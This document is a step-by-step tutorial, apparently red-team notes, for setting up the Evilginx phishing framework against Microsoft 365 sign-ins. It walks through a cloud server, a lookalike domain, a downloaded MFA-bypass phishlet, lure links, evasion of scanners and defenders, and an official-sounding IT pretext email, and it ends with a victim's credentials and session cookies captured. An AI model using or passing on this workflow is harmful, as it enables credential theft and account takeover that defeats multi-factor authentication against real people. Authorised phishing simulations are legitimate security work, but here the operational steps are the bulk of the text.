# Evilginx Man-in-the-Middle attack framework

### Github repo: https://github.com/kgretzky/evilginx2

### Resources: https://breakdev.org/evilginx-3-3-go-phish/

## Setup:

### Our Evilginx server needs to be accessible over the internet and for this we can stand up a VM from any cloud provider. If the target uses Azure (for example) then this cloud platform address space is likely to be allowlisted, so it would make sense to stand up an Azure virtual machine in that case. We used a Ubuntu Linux EC2 instance.

 - ./evilginx (Run evilginx)

### After running our built evilginx binary we confirm it's working see that we need to specify the path to a directory containing our Evilginx phishlets. Phishlets are small YAML configuration files that configure Evilginx to target specific websites for phishing attacks. The example phishlet exists in the phishlets directory by default.

 - build/evilginx -p phishlets (Specify a path to a directory containing our Evilginx phishlets)

### Next, we need to configure the domain to use for our phishing campaign. You can register a domain if needed. We have used the domain LEGITIMATE_DOMAIN that looks legitimate (example). We also provide Evilginx with the public IP address of the VM or any redirector you have configured. 

 - config ipv4 external EXTERNAL_IP

 - config domain LEGITIMATE_DOMAIN.COM

 - cd phishlets

 - wget https://raw.githubusercontent.com/faelsfernandes/evilginx3-phishlets/main/o365-mfa.yaml (Navigate to the phishlets directory and download a phishlet of your choosing)

### A few phishing subdomains were specified in the phishlet and we can go ahead and create A host records for them in the DNS management section of our domain (your domain provider may look different).

### In the Evilginx console we can configure the hostname that should be used with the phishlet.

 - phishlets hostname PHISHLET_NAME LEGITIMATE_DOMAIN.COM

 - phishlets enable PHISHLET_NAME

 - phishlets hide EXAMPLE_PHISHLET

### Running Evilginx again we see our phishlet and can now create a lure! Lures are pre-generated phishing links that will be sent out on phishing engagements.

### If you want to check the state of your phishlets at any time, you can do so using the phishlets command. Some other helpful commands are below.

Action                =              Command
-----------                         -----------
Function              =              Clear-Token 

Start Evilginx         =             ./evilginx

Close Evilginx          =            exit

Get the phising URL      =           lures get-url <lure-id>

Get the config            =          config

List all phishlets         =         phishlets

List all sessions           =        sessions

Get details from specific session  = sessions <session-id>

Clear screen           =             clear

Hide a phishlet         =            phishlets hide <phishlet-name>

Unhide a phishlet        =           phishlets unhide <phishlet-name>

### Now let's create a lure for our PHISHLET_NAME phishlet! We can actually create multiple lures per phishlet if we wanted to, for example we might want different targets to have different redirect URLs.

 - lures create PHISHLET_NAME

 - lures

 - lures get-url 0

### For requests to our Evilginx server that don't contain a lure path, we can assume that they are scanners (or the blue team), and then redirect these "unauthenticated" requests to a different URL. 

### Evilginx also enables and updates a blocklist by default. The IP addresses associated with any requests that don't contain a valid lure URL will automatically be added to the blocklist.

### Visiting our phishing site LEGITIMATE_DOMAIN in the browser we see the Microsoft Online sign-in page (example)!

### Next to craft our email lure and pretext! Emails from IT that sound official and demand compliance can be successful.

### After sending the email, we find that our victim clicked on the link and entered his username and password, and possibly also the MFA token if this is configured!

 - sessions NUM (See that we have successfully captured cookies for the login session)
